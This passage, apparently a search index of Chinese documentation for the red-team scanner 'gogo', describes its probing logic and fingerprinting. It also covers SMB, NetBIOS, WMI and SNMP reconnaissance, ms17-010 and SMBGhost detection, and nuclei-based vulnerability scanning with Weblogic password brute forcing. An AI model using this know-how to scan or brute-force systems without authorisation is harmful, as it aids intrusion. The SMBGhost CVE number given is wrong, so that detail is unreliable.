\u5982\u679c\u8fd4\u56de400\u72b6\u6001\u7801\u6216\u8005\u975eHTTP\u534f\u8bae, \u5219\u4f1a\u5347\u7ea7\u5230HTTPs\u53d1\u9001\u4e00\u4e2a\u8bf7\u6c42, \u8fdb\u4e00\u6b65\u7684\u83b7\u53d6\u9700\u8981\u7684\u4fe1\u606f\u4ee5\u53ca\u6392\u9664\u6389\u5e72\u6270.\u4e5f\u5c31\u662f\u8bf4, \u5173\u95ed\u7740\u7684\u7aef\u53e3\u53ea\u9700\u89811\u4e2asyn\u5305\u5224\u65ad\u5176\u72b6\u6001, \u800c\u5982\u679c\u662f\u666e\u901a\u7684HTTP\u670d\u52a1\u6216TCP\u534f\u8bae\u7684\u670d\u52a1, \u4ec5\u4ec5\u9700\u89813\u6b21TCP\u63e1\u624b+\u4e00\u4e2a\u6700\u7b80get\u8bf7\u6c42\u5373\u53ef\u5b8c\u6210\u57fa\u672c\u4fe1\u606f\u7684\u83b7\u53d6.\u53ea\u6709\u662fHTTPs\u624d\u9700\u89815\u6b21TCP\u4ea4\u4e92\u4ee5\u53ca9\u6b21tls\u4ea4\u4e92.</p> <p>\u4e3a\u4ec0\u4e48\u4e0d\u4f7f\u7528tls hello\uff1f</p> <p>\u9996\u5148\u9700\u8981\u77e5\u9053, \u5982\u679cHTTP/HTTPs\u6536\u5230\u4e0d\u7b26\u5408\u6807\u51c6\u7684\u6570\u636e\u5305, \u4f8b\u5982\u5bf9HTTPs\u670d\u52a1\u53d1\u9001\u660e\u6587GET\u8bf7\u6c42, \u4f1a\u54cd\u5e94400\u6216\u8005TCP\u94fe\u63a5\u6536\u5230rst\u5305.</p> <p>\u5efa\u7acbTCP\u63e1\u624b\u7684\u65f6\u5019\u8fd8\u4e0d\u80fd\u786e\u5b9a\u662f\u5426\u662fHTTP/HTTPs\u670d\u52a1. \u8fd9\u65f6\u5019\u53d1\u9001\u4e00\u4e2atls hello, \u5982\u679c\u662fHTTPs\u670d\u52a1, \u5219\u80fd\u63a5\u6536\u5230server hello, \u7ee7\u7eed\u63a5\u4e0b\u53bb\u63e1\u624b\u8ba4\u8bc1\u76f4\u5230\u53d1\u9001HTTPs GET.\u5982\u679c\u662fHTTP\u670d\u52a1\u53ef\u80fd\u4f1a\u56de\u5e94400\u534f\u8bae\u9519\u8bef\u6216\u8005RST\u5305,  \u8fd9\u6837\u6211\u4eec\u8fd8\u9700\u8981\u53d1\u9001\u8981\u7ed9GET\u8bf7\u6c42, \u518d\u6b21\u901a\u8fc7\u8fd4\u56de\u7684\u62a5\u6587\u6216\u8005\u72b6\u6001\u7801\u5224\u65ad\u662f\u5426\u662fHTTP\u670d\u52a1.</p> <p>\u5148\u4f7f\u7528GET\u670d\u52a1, \u5982\u679c\u662fHTTPs\u670d\u52a1, \u5219\u4f1a\u56de\u5e94400\u6216\u8005rst\uff1b\u5982\u679c\u662f\u67d0\u4e9bTCP\u670d\u52a1, \u4f8b\u5982mysql, \u5219\u4f1a\u56de\u5e94banner\uff1b\u5982\u679c\u662fHTTP\u670d\u52a1, \u987a\u4fbf\u8fd8\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u83b7\u53d6\u76ee\u6807\u7f51\u7ad9\u7684\u9996\u9875\uff1b\u5982\u679c\u6536\u5230\u4e86rst\u6216400, \u518d\u4f7f\u7528\u7cfb\u7edf\u5e93\u4e2d\u7684HTTP api, \u518d\u6b21\u53d1\u9001\u4e00\u4e2aHTTPs\u7684GET\u8bf7\u6c42\uff1b\u5982\u679c\u8fd8\u4e0d\u6210\u529f, \u5219\u5224\u65ad\u8be5\u7aef\u53e3\u8fd0\u884c\u7740TCP\u670d\u52a1.</p> <p>\u8fd9\u4e24\u79cd\u65b9\u5f0f\u7684\u7406\u8bbaTTL\u90fd\u662f4-5ttl\uff08\u4e24\u6b21 1.5TCP\u63e1\u624b + 1 HTTP request/response\uff09.\u4f46\u662f\u663e\u7136HTTP\u670d\u52a1\u5728\u5185\u7f51\u66f4\u52a0\u5e38\u89c1, \u800c\u4e14\u4e0d\u7528\u8003\u8651TLS\u7248\u672c\u7684\u95ee\u9898\uff08HTTP\u4e5f\u9700\u8981\u5728\u6781\u5c11\u6570\u60c5\u51b5\u4e0b\u8003\u8651HTTP1.0\u95ee\u9898\uff09.\u56e0\u6b64, \u6211\u91c7\u7528\u4e86\u66f4\u7b80\u5355\u7684HTTP GET\u8bf7\u6c42\u7684\u65b9\u5f0f.</p> <p>\u901a\u8fc7\u5efa\u7acbTCP\u63e1\u624b, \u7136\u540e\u53d1\u9001GET\u8bf7\u6c42, \u518d\u6839\u636e\u8fd4\u56de\u51b3\u5b9a\u662f\u5426\u53d1\u9001HTTPs\u7684GET\u8bf7\u6c42\u7684\u65b9\u5f0f\u5c31\u662f\u76ee\u524dgogo\u5bf9\u6bcf\u4e2a\u7aef\u53e3\u6700\u57fa\u7840\u7684\u63a2\u6d4b.</p> <p>\u8fd9\u4e2a\u63a2\u6d4b, \u4e0d\u4ec5\u80fd\u83b7\u53d6\u5230\u7aef\u53e3open\u7684\u4fe1\u606f, \u5982\u679c\u662fHTTP/HTTPs\u670d\u52a1, \u8fd8\u80fd\u83b7\u53d6\u5230index\u9875\u9762\u3001title\u3001\u8bc1\u4e66\u4fe1\u606f\u3001\u72b6\u6001\u7801\u3001header\u4e2d\u7684Server\u3001set-cookie, \u751a\u81f3\u8fdb\u884c\u88ab\u52a8\u7684\u6307\u7eb9\u6536\u96c6.\u5982\u679c\u662fTCP\u670d\u52a1, \u5219\u6709\u66f4\u591a\u7684\u60c5\u51b5, \u540e\u9762\u4f1a\u4e00\u4e00\u89e3\u91ca.</p> <p>\u6240\u4ee5\u4f7f\u7528socket\u6784\u9020\u7684HTTP get \u4f1a\u6bd4tls hello \u5c11\u4e0a\u5927\u69820.5 ttl</p>"},{"location":"gogo/concept/","title":"gogo \u00b7 \u7ec6\u8282","text":""},{"location":"gogo/concept/#\u57fa\u7840\u626b\u63cf","title":"\u57fa\u7840\u626b\u63cf","text":"<p>\u7ea2\u961f\u573a\u666f\u4e2d, \u5229\u7528\u7684\u6f0f\u6d1e99%\u90fd\u662fTCP\u534f\u8bae, udp\u534f\u8bae\u4e00\u822c\u7528\u4f5c\u4fe1\u606f\u6536\u96c6, \u5e76\u4e14udp\u534f\u8bae\u7aef\u53e3\u4e00\u822c\u90fd\u662f\u56fa\u5b9a\u7684.\u56e0\u6b64, gogo\u53ea\u4e13\u6ce8\u4e8eTCP\u534f\u8bae\u7684\u7aef\u53e3\u63a2\u6d4b\u548c\u6307\u7eb9\u8bc6\u522b.\u53ea\u5bf9\u5c11\u6570\u51e0\u4e2aUDP\u670d\u52a1\u505a\u4e86\u7279\u6b8a\u652f\u6301, \u4f8b\u5982nbtcsan.</p> <p>gogo\u4f7f\u7528\u7684\u662fgo\u81ea\u5e26\u7684socket\u5e93 + net/HTTP\u5e93\u5b9e\u73b0\u7684TCP\u5168\u8fde\u63a5\u626b\u63cf. \u5728\u5168\u8fde\u63a5\u626b\u63cf\u4e2d, \u901a\u8fc7\u7aef\u53e3\u72b6\u6001\u5373\u53ef\u83b7\u5f97\u5927\u91cf\u4fe1\u606f, \u5982\u679c\u662fHTTP\u534f\u8bae, \u66f4\u662f\u80fd\u83b7\u5f97\u5168\u90e8\u7ea2\u961f\u6240\u9700\u8981\u7684\u57fa\u672c\u4fe1\u606f.</p>"},{"location":"gogo/concept/#\u7279\u6b8a\u7aef\u53e3","title":"\u7279\u6b8a\u7aef\u53e3","text":"<p>\u5f53\u7136, \u9488\u5bf9\u4e00\u4e9b\u7279\u6b8a\u7aef\u53e3, \u5b9e\u9645\u4e0a\u5e76\u4e0d\u9700\u8981\u521a\u624d\u63d0\u5230\u7684\u90a3\u4e9b\u6d41\u7a0b. \u4f8b\u5982445(SMB)\u300122(SSH),  \u51e0\u4e4e\u4e0d\u4f1a\u6709\u5176\u5b83\u670d\u52a1\u5360\u7528\u8fd9\u4e9b\u7aef\u53e3, \u56e0\u6b64\u53ef\u4ee5\u9488\u5bf9\u6027\u7684\u505a\u4e00\u4e9b\u5b9a\u5236\u5316\u7684\u626b\u63cf.</p> <p>SMB</p> <p>\u4f7f\u7528: <code>-p smb</code> or <code>-p 445</code></p> <ul> <li>ntlm\u4fe1\u606f\u6536\u96c6, smb\u7684\u4fe1\u606f\u6536\u96c6\u7565\u5fae\u51b7\u95e8, \u4f3c\u4e4e\u662f\u5728\u8fd9\u4e24\u5e74\u624d\u88ab\u6b66\u5668\u5316, \u53ef\u4ee5\u901a\u8fc7ntlm\u8ba4\u8bc1\u7684\u524d\u9762\u4e24\u4e2a\u9636\u6bb5\u83b7\u53d6\u5230windows\u8be6\u7ec6\u7248\u672c\u53f7\u3001dns\u4e3b\u673a\u540d\u4ee5\u53ca\u4e3b\u673a\u540d\u3001\u57df\u540d.</li> <li>ms17-010\u63a2\u6d4b, \u9700\u5f00\u542f<code>-e</code>\u63a2\u6d4b\u662f\u5426\u5b58\u5728ms17-010\u6f0f\u6d1e\u4ee5\u53ca\u662f\u5426\u5df2\u7ecf\u88ab\u79cd\u4e0bdoublepulsar\u540e\u95e8, \u901a\u8fc7smb\u7684\u4e00\u4e9b\u6807\u5fd7\u4f4d\u5224\u65ad, \u4e0d\u662f\u6ea2\u51fa\u653b\u51fb, \u56e0\u6b64\u8be5\u6f0f\u6d1e\u63a2\u6d4b\u4e0d\u4f1a\u5bf9\u76ee\u6807\u7cfb\u7edf\u9020\u6210\u635f\u574f.</li> <li>smbghost \u9700\u5f00\u542f<code>-e</code>, \u63a2\u6d4b\u76ee\u6807\u662f\u5426\u5b58\u5728CVE-2019-0796\u6f0f\u6d1e, \u91c7\u7528\u4e86\u66f4\u52a0\u51c6\u786e\u7684\u65b9\u5f0f, \u5224\u65ad\u7279\u5b9a\u7684\u6807\u5fd7\u4f4d.</li> </ul> <p>NetBOIS</p> <p>\u4f7f\u7528: <code>-p nbt</code> or <code>-p 137</code></p> <p>\u4e3b\u8981\u7528\u6765\u6536\u96c6\u57df\u540d\u3001shared\u4ee5\u53ca\u662f\u5426\u4e3aDC\u7684\u4fe1\u606f.\u4f3c\u4e4e\u8fd8\u53ef\u4ee5\u6536\u96c6\u5230\u4e00\u4e9b\u5176\u4ed6\u4fe1\u606f, \u6b63\u5728\u7814\u7a76\u4e2d.</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f, nbt\u4f7f\u7528\u7684\u662fudp, \u9ad8\u5e76\u53d1\u7684\u60c5\u51b5\u4e0b\u4f1a\u4ea7\u751f\u6f0f\u62a5, \u5efa\u8bae\u542f\u53d1\u5f0f\u626b\u63cf\u7ed3\u675f\u540e, \u5355\u72ec\u5bf9\u5b58\u6d3bip\u8fdb\u884c\u4e00\u6b21nbt\u626b\u63cf, \u786e\u4fdd\u51c6\u786e\u7387.</p> <p>WMI</p> <p>\u4f7f\u7528: <code>-p wmi</code>or <code>-p 135</code></p> <p>wmi\u9ed8\u8ba4\u6536\u96c6\u5230\u7684\u4fe1\u606f\u4e0esmb\u9ed8\u8ba4\u662f\u4e00\u6837\u7684, \u90fd\u662f\u901a\u8fc7ntlm\u534f\u8bae\u83b7\u53d6\u4e3b\u673a\u540d\u57df\u540d\u4e0e\u8ba1\u7b97\u673a\u7248\u672c\u53f7.</p> <p>OXID</p> <p>\u4f7f\u7528: <code>-p oxid</code></p> <p>wmi\u7aef\u53e3\u8fd8\u80fd\u83b7\u5f97\u7f51\u5361\u4fe1\u606f, \u5bfb\u627e\u5185\u7f51\u4e2d\u7684\u591a\u7f51\u5361\u673a\u5668. \u4f7f\u7528\u7684\u662fwmi\u534f\u8bae, \u4e3a\u4e86\u533a\u5206wmi, \u4f7f\u7528oxid\u5173\u952e\u5b57.</p> <p>SNMP</p> <p>\u4f7f\u7528: <code>-p snmp</code> or <code>-p 161</code></p> <p>\u5224\u65ad\u662f\u5426\u662f\u8def\u7531\u5668\u3001\u4ea4\u6362\u673a\u4ee5\u53ca\u83b7\u53d6\u8bbe\u5907\u7684\u540d\u79f0, \u6b64\u5916, snmp\u4e2d\u8fd8\u6709\u4e00\u4e9b\u60ca\u559c, \u53ef\u80fd\u5b58\u5728\u5185\u7f51\u62d3\u6251\u4fe1\u606f, \u4e0d\u8fc7\u9700\u8981\u4f7f\u7528\u5355\u72ec\u7684\u5de5\u5177, \u5982snmpwalk.</p>"},{"location":"gogo/concept/#\u6307\u7eb9\u8bc6\u522b","title":"\u6307\u7eb9\u8bc6\u522b","text":""},{"location":"gogo/concept/#\u88ab\u52a8\u8bc6\u522b","title":"\u88ab\u52a8\u8bc6\u522b","text":"<p>\u8fd9\u91cc\u63d0\u5230\u7684\u88ab\u52a8\u6307\u7eb9\u8bc6\u522b\u4e0d\u662f\u771f\u7684\u4e0d\u53d1\u5305, \u800c\u662f\u76f8\u5bf9\u6765\u8bf4\u4e0d\u989d\u5916\u53d1\u5305.\u56e0\u4e3a\u8bc6\u522bHTTP\u4e0eHTTPs\u9700\u8981\u53d1\u9001\u4e00\u4e2aHTTP GET\u5305, \u8fd9\u4e2a\u5305\u7528\u6765\u5224\u65adHTTPs/HTTP/TCP, \u540c\u65f6\u8fd8\u53ef\u4ee5\u7528\u4f5c\u6307\u7eb9\u8bc6\u522b.</p> <p>\u5b9e\u9645\u5b9e\u73b0\u7684\u65f6\u5019, \u53d1\u73b0\u5e02\u9762\u4e0a\u5e76\u6ca1\u6709\u8db3\u591f\u5f3a\u5927\u3001\u5168\u9762\u7684\u6307\u7eb9\u5e93.</p> <p>\u5199\u8fd9\u7bc7\u6587\u6863\u7684\u65f6\u5019,\u6709\u4e2a\u8db3\u591f\u5f3a\u5927\u7684\u6307\u7eb9\u5e93\u4e86:HTTPs://github.com/0x727/FingerprintHub.\u53ef\u60dc\u5386\u53f2\u9057\u7559\u95ee\u9898\u76f4\u63a5\u517c\u5bb9\u8fd9\u4e2a\u6307\u7eb9\u5e93\u53ef\u80fd\u6548\u679c\u4e0d\u4f1a\u66f4\u597d, \u6240\u4ee5\u4fdd\u7559\u4e86\u539f\u6709\u7684\u6307\u7eb9\u5e93, \u800c\u4e14\u8fd9\u4e2a\u6307\u7eb9\u5e93\u53ea\u9650\u4e8eHTTP\u7684\u5404\u79cd\u6307\u7eb9, \u4e0d\u652f\u6301TCP\u6307\u7eb9.</p> <p>\u4e5f\u56e0\u4e3a\u8fd9\u6307\u7eb9\u5e93\u4e2d\u7684\u6307\u7eb9\u591a\u4f46\u662f\u8d28\u91cf\u5e76\u4e0d\u4e00\u5b9a\u9ad8, \u6240\u4ee5\u9009\u62e9\u4e86\u7b5b\u9009\u90e8\u5206\u9ad8\u4ef7\u503c\u6307\u7eb9\u7684\u65b9\u5f0f\u5408\u5e76.</p> <p>\u8fd8\u6709\u4e00\u4e2a\u7ec6\u8282, \u5728\u6307\u7eb9\u8bc6\u522b\u7684\u65f6\u5019, \u4e0d\u53ea\u662f\u8fd4\u56de\u8bc6\u522bture or false\u7684\u5e03\u5c14\u503c, \u4e5f\u53ef\u4ee5\u83b7\u53d6\u4e00\u4e9b\u7248\u672c\u53f7\u4fe1\u606f, \u4f8b\u5982tomcat \u4f1a\u5728\u62a5\u9519\u9875\u9762\u7559\u4e0b\u7248\u672c\u53f7, \u6307\u7eb9\u8bc6\u522b\u7684\u540c\u65f6\u53ef\u4ee5\u63d0\u53d6\u8be5\u4fe1\u606f.gogo\u4e5f\u505a\u4e86\u5bf9\u5e94\u7684\u4f18\u5316\u4e0e\u5feb\u6377\u5b9e\u73b0\u7684\u65b9\u5f0f.</p> <p>HTTP\u6307\u7eb9</p> <p>\u652f\u6301header\u3001body\u3001\u6b63\u5219\u3001hash\u56db\u79cd\u5339\u914d\u65b9\u5f0f, \u5e76\u4e14\u5bf9\u6b63\u5219\u8fdb\u884c\u4e86\u9884\u7f16\u8bd1.</p> <p>\u6307\u7eb9\u5e93\u6765\u81ea:</p> <ul> <li>HTTPs://github.com/0x727/FingerprintHub</li> <li>HTTPs://github.com/TideSec/TideFinger</li> <li>\u81ea\u884c\u6536\u96c6\u7684\u4e0a\u767e\u4e2a\u6307\u7eb9</li> <li>fofa/goby\u6307\u7eb9</li> <li>...</li> </ul> <p>TCP\u6307\u7eb9</p> <p>TCP\u4e5f\u6709\u4e00\u4e2a\u7ecf\u9a8c\u516c\u5f0f, \u5927\u591a\u6570TCP\u7aef\u53e3\u4f1a\u5f00\u653e\u5728\u9ed8\u8ba4\u7aef\u53e3\u4e14\u4e00\u4e2aTCP\u7aef\u53e3\u901a\u5e38\u53ea\u6709\u4e00\u4e2a\u670d\u52a1.\u56e0\u6b64HTTP\u534f\u8bae\u626b\u63cf\u5230\u4e00\u4e2a\u6307\u7eb9\u540e\u4e0d\u4f1a\u505c\u6b62, \u800cTCP\u534f\u8bae\u4f1a\u505c\u6b62\u6307\u7eb9\u8bc6\u522b.</p> <p>\u4e4b\u524d\u4e5f\u63d0\u5230\u4e86, \u6211\u4f7f\u7528\u7684\u662fTCP\u7684socket\u53d1\u9001HTTP GET\u5305, \u67d0\u4e9b\u60c5\u51b5\u4e0b\u4e00\u4e9bTCP\u7aef\u53e3\u4e5f\u4f1a\u8fd4\u56de\u4e00\u4e9b\u4e8c\u8fdb\u5236\u6570\u636e, \u751a\u81f3\u67d0\u4e9b\u7aef\u53e3\u5efa\u7acb\u8fde\u63a5\u540e\u4f1a\u4e3b\u52a8\u8fd4\u56de\u4e00\u4e9b\u4fe1\u606f. \u524d\u8005\u4f8b\u5982mysql, \u540e\u8005\u4f8b\u5982redis.</p> <p>\u5982\u679cTCP\u7684\u7cbe\u51c6\u6307\u7eb9\u8bc6\u522b\u5931\u6548, \u6839\u636e\u53e6\u5916\u4e00\u4e2a\u7ecf\u9a8c\u516c\u5f0f, \u5927\u591a\u6570TCP\u4e0d\u4f1a\u4fee\u6539\u9ed8\u8ba4\u7aef\u53e3\u6765\u6839\u636eport.yaml\u4e2d\u914d\u7f6e\u7684\u7aef\u53e3\u53f7\u53cd\u5411\u731c\u6d4b\u670d\u52a1, \u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u731c\u6d4b\u51fa\u6765\u7684\u6307\u7eb9\u5c06\u4f1a\u5e26\u4e0a\u4e00\u4e2a\u661f\u53f7.</p> <p>TCP\u6307\u7eb9\u6709\u4e00\u4e2a\u975e\u5e38\u5f3a\u5927\u7684\u6307\u7eb9\u5e93\u6765\u81eanmap: HTTPs://raw.githubusercontent.com/nmap/nmap/master/nmap-service-probes</p> <p>\u56e0\u6b64\u5927\u90e8\u5206TCP\u6307\u7eb9\u4ecenmap\u4e2d\u8fc1\u79fb.</p> <p>\u7531\u4e8e\u4eba\u529b\u6709\u9650\u53ea\u5b9e\u73b0\u4e86\u5c11\u90e8\u5206\u6307\u7eb9, \u6709\u91cd\u70b9\u6307\u7eb9\u9700\u6c42\u7684\u53ef\u4ee5\u8054\u7cfb\u6211.</p>"},{"location":"gogo/concept/#\u4e3b\u52a8\u8bc6\u522b","title":"\u4e3b\u52a8\u8bc6\u522b","text":"<p>\u4e3b\u52a8\u6307\u7eb9\u662f\u53e6\u5916\u4e00\u4e2a\u7ef4\u5ea6\u4e86, \u9700\u8981\u53d1\u9001\u5408\u9002\u7684\u6570\u636e\u5305, \u800c\u4e14\u4f1a\u4ea7\u751f\u5f88\u5927\u7684\u8d44\u6e90\u8d1f\u62c5.\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898, \u6211\u4e5f\u505a\u4e86\u5404\u79cd\u4f18\u5316.</p> <p>HTTP\u6307\u7eb9</p> <p>HTTP\u6709\u4e3b\u52a8\u53d1\u5305\u6709\u4e00\u4e9b\u901a\u7528\u6307\u7eb9, \u4f8b\u5982favicon.ico.\u5e02\u9762\u4e0a\u4e5f\u6709\u4e00\u4e9bfavicon.ico\u7684hash\u5e93\u5e76\u4e14\u505a\u6210\u4e86hash\u8868, \u5339\u914d\u901f\u5ea6\u6781\u5feb.favicon.ico\u7684hash\u4e3b\u8981\u6709md5\u548cmmh3, \u76ee\u524d\u4f1a\u540c\u65f6\u5339\u914d\u8fd9\u4e24\u79cd(\u4e3a\u4e86\u517c\u5bb9\u5e02\u9762\u4e0a\u7684\u6307\u7eb9\u5e93), hash\u6307\u7eb9\u5e93\u4e5f\u662f\u540c\u65f6\u7ef4\u62a4\u8fd9\u4e24\u79cdhash.</p> <p>\u5176\u6b21, 404\u9875\u9762\u4e5f\u53ef\u80fd\u5e26\u6709\u4e00\u4e9b\u6b63\u5e38\u60c5\u51b5\u4e0b\u8bc6\u522b\u4e0d\u5230\u7684\u6307\u7eb9.</p> <p>\u6700\u540e, \u7279\u5b9a\u7684\u5e26\u6709\u6307\u7eb9\u7684\u7279\u5b9a\u8def\u7531\u9700\u8981\u901a\u8fc7\u7c7b\u4f3c\u76ee\u5f55\u7206\u7834\u7684\u624b\u6bb5\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b.\u4f46\u8fd9\u79cd\u6307\u7eb9\u4e0d\u5b9c\u8fc7\u591a, \u6bcf\u6dfb\u52a0\u4e00\u4e2a\u90fd\u4f1a\u5728\u5f00\u542f<code>-v</code>\u65f6\u5bf9\u6240\u6709HTTP\u534f\u8bae\u7684\u76ee\u6807\u53d1\u9001\u4e00\u4e2a\u8bf7\u6c42.\u5e26\u6765\u7684\u6027\u80fd\u635f\u8017\u662f\u975e\u5e38\u5de8\u5927\u7684, \u6240\u4ee5gogo\u7684\u539f\u5219\u662f\u975e\u5fc5\u8981\u4e0d\u6dfb\u52a0, \u540e\u7eed\u4e00\u4e9b\u4e3b\u52a8\u6307\u7eb9\u5c06\u4f1a\u8fc1\u79fb\u5230nuclei poc\u7684\u65b9\u5f0f, \u5148\u5339\u914d\u524d\u7f6e\u6307\u7eb9\u518d\u8fdb\u884c\u4e3b\u52a8\u53d1\u5305\u83b7\u53d6\u66f4\u91cd\u8981\u7684\u6307\u7eb9.\u4ee5Weblogic\u4e3a\u4f8b, \u5148\u8bc6\u522b\u5230Weblogic, \u518d\u901a\u8fc7nuclei poc\u53bb\u8bc6\u522bconsole, \u800c\u975e\u73b0\u5728\u7684\u5168\u90e8HTTP\u534f\u8bae\u53d1\u9001<code>/console</code>\u7684\u8bf7\u6c42.</p> <p>\u6b64\u5916, \u67d0\u4e9bURL\u5b58\u5728\u6216\u8005\u67d0\u4e9b\u5b57\u6bb5\u4ee3\u8868\u7740\u5b58\u5728\u6f0f\u6d1e, \u4e3a\u6b64\u505a\u4e86\u4e00\u4e9b\u7279\u6b8a\u5904\u7406, \u53ef\u4ee5\u5728\u6307\u7eb9\u5e93\u4e2d\u914d\u7f6e\u6f0f\u6d1e\u6307\u7eb9, \u5c06\u4f1a\u5728\u7ed3\u679c\u4e2d\u7279\u6b8a\u6807\u8bb0, \u76ee\u524d\u5bf9Tomcat\u548cWeblogic\u505a\u4e86\u5bf9\u5e94\u7684\u4f18\u5316, \u8fd9\u4e00\u90e8\u5206\u540e\u7eed\u5c06\u4f1a\u8fc1\u79fb\u5230nuclei poc\u4e2d.</p> <p>\u5982\u679cHTTP\u4e3b\u52a8\u6307\u7eb9\u5e93\u8fc7\u5927, \u8017\u65f6\u53ef\u80fd\u4f1a\u7279\u522b\u957f, \u56e0\u6b64\u6211\u52a0\u5165\u4e86\u6307\u7eb9\u4f18\u5148\u7ea7\u7684\u6982\u5ff5, \u5f53\u524d\u9ed8\u8ba4\u88ab\u52a8\u6307\u7eb9\u4f18\u5148\u7ea7\u4e3a0, \u4e3b\u52a8\u6307\u7eb9\u5747\u4e3a1, \u9884\u7559\u4e86\u5927\u4e8e1\u7684\u6307\u7eb9\u7528\u4f5c\u5927\u89c4\u6a21\u76ee\u5f55\u7206\u7834\u6216\u8005\u901a\u8fc7js\u6307\u7eb9\u8bc6\u522b, \u76ee\u524d\u8fd8\u6ca1\u6709\u5b9e\u88c5.</p> <p>\u5982\u679c\u8f93\u5165\u7684\u503c\u5e26host, \u4f8b\u5982<code>gogo -i baidu.com</code> \u6216cert\u4fe1\u606f\u4e2d\u5b58\u5728\u6570\u636e,  \u90a3\u4e48\u5728\u5f00\u542f<code>-v</code>\u65f6\u5c06\u4f1a\u989d\u5916\u6dfb\u52a0\u4e00\u4e2a\u9636\u6bb5, \u5c06\u4f1a\u5e26\u4e0ahost\u53bb\u8bf7\u6c42, \u5e76\u5bf9\u6bd4\u4e0e\u57fa\u7840\u6570\u636e\u662f\u5426\u5b58\u5728\u4e0d\u540c. \u5982\u679chost\u626b\u63cf\u7684\u7ed3\u679c\u53d1\u73b0\u65b0\u7684\u6570\u636e, \u90a3\u4e48nuclei poc\u626b\u63cf\u9636\u6bb5\u5c06\u4f1a\u5e26\u4e0ahost.</p> <p>\u5c0f\u7ed3:</p> <ul> <li>favicon \u6307\u7eb9</li> <li>\u76ee\u5f55\u7206\u7834\u8bc6\u522b\u6307\u7eb9</li> <li>404\u6307\u7eb9(todo)</li> <li>host\u6307\u7eb9</li> </ul> <p>TCP\u6307\u7eb9</p> <p>TCP\u7684\u4e3b\u52a8\u6307\u7eb9\u4e5f\u662f\u53e6\u4e00\u4e2a\u7ef4\u5ea6.\u521a\u624d\u63d0\u5230\u4e86TCP\u7684\u7ecf\u9a8c\u516c\u5f0f, \u90a3\u4e48\u4f7f\u7528\u8fd9\u4e2a\u7ecf\u9a8c\u516c\u5f0f, \u5728\u4e3b\u52a8\u8bc6\u522b\u9636\u6bb5\u4e5f\u53ef\u4ee5\u8fdb\u884c\u4e00\u4e9b\u4f18\u5316.</p> <p>\u5927\u90e8\u5206TCP\u7aef\u53e3\u9700\u8981\u4e3b\u52a8\u53d1\u5305, \u6839\u636e\u8fd9\u4e2a\u7ecf\u9a8c, \u53ef\u4ee5\u505a\u4e00\u4e9b\u4f18\u5316, \u4f18\u5148\u53d1\u9001\u9ed8\u8ba4\u7aef\u53e3\u7684\u63a2\u6d4b\u6570\u636e\u5305,  \u5982\u679c\u5339\u914d\u5230\u4e86\u4efb\u610f\u4e00\u4e2a\u6307\u7eb9, \u5c31\u4e0d\u8fdb\u884c\u540e\u7eed\u53d1\u5305.</p> <p>\u4e3b\u52a8\u53d1\u5305\u7684TCP\u6307\u7eb9\u5e93\u4e3b\u8981\u4e5f\u6765\u81eanmap.</p> <p>\u4f7f\u7528</p> <p>\u88ab\u52a8\u6307\u7eb9\u5c06\u4f1a\u81ea\u52a8\u542f\u7528, \u4e0d\u9700\u8981\u6dfb\u52a0\u53c2\u6570, \u800c\u4f7f\u7528\u4e3b\u52a8\u63a2\u6d4b\u7684\u6307\u7eb9\u9700\u8981\u6dfb\u52a0<code>-v</code>\u53c2\u6570</p>"},{"location":"gogo/concept/#\u6f0f\u6d1e\u63a2\u6d4b","title":"\u6f0f\u6d1e\u63a2\u6d4b","text":"<p>\u4f7f\u7528: <code>-e</code></p> <p>\u4e00\u4e9b\u6f0f\u6d1e\u63a2\u6d4b\u4f7f\u7528go\u7684\u5f62\u5f0f\u5b9e\u73b0, \u4f8b\u5982ms17-010, shiro.smbghost, snmp\u7684\u63a2\u6d4b.\u539f\u56e0\u662f\u8fd9\u4e9b\u9700\u8981\u591a\u6b21\u4ea4\u4e92\u6216\u8005\u52a8\u6001\u751f\u6210\u4e00\u4e9b\u53c2\u6570, \u800c\u5927\u90e8\u5206poc\u5219\u4f7f\u7528\u4e86nuclei.</p> <p>\u6700\u521d   \u81f3\u53ef\u4ee5\u76f4\u63a5\u4eceburp\u4e2d\u590d\u5236\u5305\u5c31\u53ef\u4ee5\u5b8c\u6210\u4e00\u4e2apoc\u7684\u7f16\u5199.</p> <p>\u81ea\u884c\u5f00\u53d1\u7684\u63d2\u4ef6\u53ef\u4ee5\u4f7f\u7528<code>gogo -ef file</code>\u52a0\u8f7d\u63d2\u4ef6\u6587\u4ef6</p> <p>\u626b\u63cf\u7684\u65f6\u5019, \u6253\u5168\u91cfpoc\u662f\u4e00\u4ef6\u5f88\u8822\u7684\u884c\u4e3a, \u56e0\u6b64<code>-e</code>\u53c2\u6570\u5b9e\u9645\u4e0a\u662f\u7b49\u4e8e<code>-E auto</code>, \u4e5f\u5c31\u662f\u8bbe\u7f6e\u6210\u81ea\u52a8\u6f0f\u626b\u6a21\u5f0f, \u8fd9\u4e2a\u6a21\u5f0f\u5c06\u4f1a\u5148\u8bc6\u522b\u5230\u6307\u7eb9\u518d\u8c03\u7528\u5bf9\u5e94\u7684\u6f0f\u6d1e. </p> <p>\u4ee5Weblogic\u4e3a\u4f8b, \u53ea\u6709\u63a2\u6d4b\u5230Weblogic\u6307\u7eb9, \u624d\u4f1a\u8bc6\u522biiop\u4e0et3, \u53ea\u6709\u626b\u5230Weblogic console, \u624d\u4f1a\u8fdb\u884cWeblogic\u5f31\u53e3\u4ee4\u7206\u7834.\u901a\u8fc7yaml\u4e2d\u7684chains, \u5c06\u591a\u4e2apoc\u4e32\u6210\u4e00\u4e2a\u5de5\u4f5c\u6d41, \u4ee5\u6700\u5c11\u7684\u53d1\u5305\u8fbe\u5230\u6700\u5927\u7684\u6210\u679c.</p> <p>\u5f53\u7136, \u4e5f\u6709\u8fd9\u79cd\u6253\u5168poc\u7684\u9700\u6c42, \u6240\u4ee5\u9884\u7559\u4e86\u5bf9\u5e94\u7684\u4f7f\u7528\u65b9\u5f0f.<code>-E all</code> ,\u614e\u7528</p> \u901a\u8fc7finger\u4e0e\u63d2\u4ef6\u914d\u7f6e\u7684\u6f0f\u6d1e \u901a\u8fc7finger\u914d\u7f6e\u7684vuln\u7c7b\u578b\u6f0f\u6d1e \u901a\u8fc7finger\u914d\u7f6e\u7684\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e 